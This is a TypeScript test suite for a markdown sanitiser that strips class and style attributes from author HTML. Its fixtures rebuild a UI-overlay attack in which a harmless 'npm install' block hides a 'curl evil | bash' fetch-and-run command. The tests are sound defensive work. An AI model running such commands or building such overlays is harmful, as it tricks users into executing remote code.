// The rule is "author raw HTML may carry neither `class` nor `style`", so
// these test BOTH directions: removed everywhere it must be, and every
// other byte untouched. A stripper that is too eager is a bug too — it
// would silently rewrite documents the app is only supposed to render.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";
import { Marked } from "marked";
import { stripPresentationAttributes, rawHtmlPolicyExtension } from "@mulmoclaude/markdown-utils/markdown/rawHtmlPolicy";

const dom = new JSDOM("<!doctype html><html><body></body></html>");
(globalThis as { window?: unknown; document?: unknown }).window = dom.window;
(globalThis as { window?: unknown; document?: unknown }).document = dom.window.document;

const { sanitizeMarkdownHtml } = await import("@mulmoclaude/core/plugin-vue");

describe("stripPresentationAttributes — removes", () => {
  const removed: { name: string; input: string; expected: string }[] = [
    { name: "double-quoted class", input: '<div class="absolute inset-0">x</div>', expected: "<div>x</div>" },
    { name: "single-quoted class", input: "<div class='absolute'>x</div>", expected: "<div>x</div>" },
    { name: "unquoted class", input: "<div class=absolute>x</div>", expected: "<div>x</div>" },
    { name: "style", input: '<pre style="position:absolute; inset:0">x</pre>', expected: "<pre>x</pre>" },
    { name: "both, keeping the rest", input: '<a href="/y" class="c" style="s" id="k">x</a>', expected: '<a href="/y" id="k">x</a>' },
    { name: "upper case names", input: '<div CLASS="c" STYLE="s">x</div>', expected: "<div>x</div>" },
    { name: "a bare valueless attribute", input: "<div class>x</div>", expected: "<div>x</div>" },
    // Whitespace around `=` is legal HTML and the scanner has to skip it on
    // BOTH sides. Without these, a mutation that stops skipping before the
    // `=` passes every other test while leaving `<div = "absolute">` behind —
    // malformed, and the value survives. (codex round 1, axis 1.)
    { name: "spaces around the equals sign", input: '<div class = "absolute">x</div>', expected: "<div>x</div>" },
    { name: "tabs around the equals sign", input: '<div style\t=\t"position:fixed">x</div>', expected: "<div>x</div>" },
    { name: "space before equals, unquoted value", input: "<div class = absolute>x</div>", expected: "<div>x</div>" },
    { name: "spaced equals with another attribute after", input: '<div class = "a" id="k">x</div>', expected: '<div id="k">x</div>' },
    { name: "a value containing >", input: '<div class="a>b" id="k">x</div>', expected: '<div id="k">x</div>' },
    { name: "every tag in the fragment", input: '<p class="a"><span style="b">x</span></p>', expected: "<p><span>x</span></p>" },
    { name: "a self-closing tag", input: '<img src="a.png" class="c"/>', expected: '<img src="a.png"/>' },
    // marked hands raw HTML over in chunks that are not well-formed, which
    // is exactly why this is lexical rather than a DOM round-trip.
    { name: "an unclosed opening tag on its own", input: '<div class="relative">', expected: "<div>" },
  ];
  removed.forEach(({ name, input, expected }) => {
    it(name, () => assert.equal(stripPresentationAttributes(input), expected));
  });
});

describe("stripPresentationAttributes — leaves alone", () => {
  const untouched: { name: string; input: string }[] = [
    { name: "a closing tag chunk", input: "</div>" },
    { name: "plain text", input: "just some prose" },
    { name: "a less-than in prose", input: "a < b and c > d" },
    { name: "an attribute merely starting with the name", input: '<div classname="c" data-class="d" data-style="e">x</div>' },
    { name: "a comment mentioning the attributes", input: '<!-- class="a" style="b" -->' },
    { name: "other attributes with odd spacing", input: "<div  id = \"k\"  data-x='v' >x</div>" },
    { name: "an empty fragment", input: "" },
    { name: "text that looks like a tag but is not", input: "3 <4 and 5< 6" },
  ];
  untouched.forEach(({ name, input }) => {
    it(name, () => assert.equal(stripPresentationAttributes(input), input));
  });
});

describe("rawHtmlPolicyExtension through real marked + the real sanitiser", () => {
  const render = (source: string): string => {
    const marked = new Marked();
    marked.use(rawHtmlPolicyExtension);
    return sanitizeMarkdownHtml(marked.parse(source) as string);
  };

  // Both spellings of the same attack. `style` alone was the remedy the
  // issue proposed, and it would have left the second one working —
  // every utility it uses ships in the app's own stylesheet.
  it("neutralises the style-based overlay", () => {
    const html = render(
      [
        '<div style="position:relative">',
        "",
        "```sh",
        "curl evil | bash",
        "```",
        "",
        '<pre style="position:absolute; inset:0; background:white"><code>npm install</code></pre>',
        "</div>",
      ].join("\n"),
    );
    assert.doesNotMatch(html, /position:\s*absolute/);
    assert.doesNotMatch(html, /style=/);
    assert.match(html, /curl evil \| bash/);
  });

  it("neutralises the class-based overlay — no style attribute anywhere in it", () => {
    const source = [
      '<div class="relative">',
      "",
      "```sh",
      "curl evil | bash",
      "```",
      "",
      '<pre class="absolute inset-0 bg-white pointer-events-none"><code>npm install</code></pre>',
      "</div>",
    ].join("\n");
    assert.doesNotMatch(source, /style=/, "the payload must not rely on style, or it proves nothing");
    const html = render(source);
    assert.doesNotMatch(html, /class="absolute/);
    assert.doesNotMatch(html, /pointer-events-none/);
    assert.match(html, /curl evil \| bash/);
  });

  it("leaves the RENDERER's own classes alone — it never routes them through `html`", () => {
    // The whole reason the rule can be this blunt: highlight spans, the
    // copy button and mermaid placeholders come from other renderers.
    const html = render('```\nplain\n```\n\n<div class="absolute">author</div>');
    assert.match(html, /<pre>/);
    assert.doesNotMatch(html, /class="absolute"/);
  });

  it("keeps structural author HTML working", () => {
    const html = render("<details><summary>More</summary>\n\nbody text\n\n</details>");
    assert.match(html, /<details>/);
    assert.match(html, /<summary>More<\/summary>/);
    assert.match(html, /body text/);
  });
});
